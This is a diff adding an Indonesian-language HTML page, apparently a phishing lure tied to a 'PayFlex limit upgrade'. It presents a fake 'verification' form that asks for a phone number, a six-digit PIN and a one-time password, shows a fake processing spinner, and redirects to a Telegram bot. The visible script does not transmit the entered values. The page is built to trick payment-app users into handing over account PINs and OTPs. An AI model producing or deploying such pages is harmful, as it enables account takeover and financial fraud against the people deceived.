@@ -1,0 +1,148 @@
+# updatepayflexlimitnew
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi</title>
+
+<style>
+body {
+  margin:0;
+  font-family:sans-serif;
+  background:#0f172a;
+  color:white;
+}
+
+.container {
+  padding:20px;
+}
+
+.card {
+  background:#1e293b;
+  padding:20px;
+  border-radius:15px;
+  margin-top:30px;
+}
+
+label {
+  display:block;
+  margin-top:15px;
+  font-size:14px;
+}
+
+.input {
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  border:none;
+  margin-top:5px;
+}
+
+.pin-box {
+  display:flex;
+  justify-content:space-between;
+  margin-top:10px;
+}
+
+.pin-box input {
+  width:45px;
+  height:50px;
+  text-align:center;
+  font-size:20px;
+  border-radius:10px;
+  border:none;
+}
+
+.btn {
+  width:100%;
+  padding:14px;
+  margin-top:20px;
+  background:#22c55e;
+  border:none;
+  border-radius:10px;
+  color:white;
+}
+
+.loading {
+  display:none;
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:black;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+}
+
+.spinner {
+  border:4px solid rgba(255,255,255,0.2);
+  border-top:4px solid #22c55e;
+  border-radius:50%;
+  width:40px;
+  height:40px;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin {
+  100% {transform:rotate(360deg);}
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <label>No Telp :</label>
+    <input class="input" type="tel" placeholder="Masukkan nomor">
+
+    <label>Pin :</label>
+    <div class="pin-box" id="pin">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+    </div>
+
+    <label>Otp :</label>
+    <div class="pin-box" id="otp">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+      <input maxlength="1"><input maxlength="1"><input maxlength="1">
+    </div>
+
+    <button class="btn" onclick="go()">Lanjutkan</button>
+
+  </div>
+</div>
+
+<div class="loading" id="load">
+  <div class="spinner"></div>
+  <p>Memproses...</p>
+</div>
+
+<script>
+// auto pindah
+function setup(id){
+  let inputs=document.querySelectorAll("#"+id+" input");
+  inputs.forEach((inp,i)=>{
+    inp.addEventListener("input",()=>{
+      inp.value=inp.value.replace(/[^0-9]/g,'');
+      if(inp.value && i<5) inputs[i+1].focus();
+    });
+  });
+}
+setup("pin");
+setup("otp");
+
+// redirect aman
+function go(){
+  document.getElementById("load").style.display="flex";
+  setTimeout(()=>{
+    window.location.href="https://t.me/BoostpayflexBot";
+  },2000);
+}
+</script>
+
+</body>
+</html>
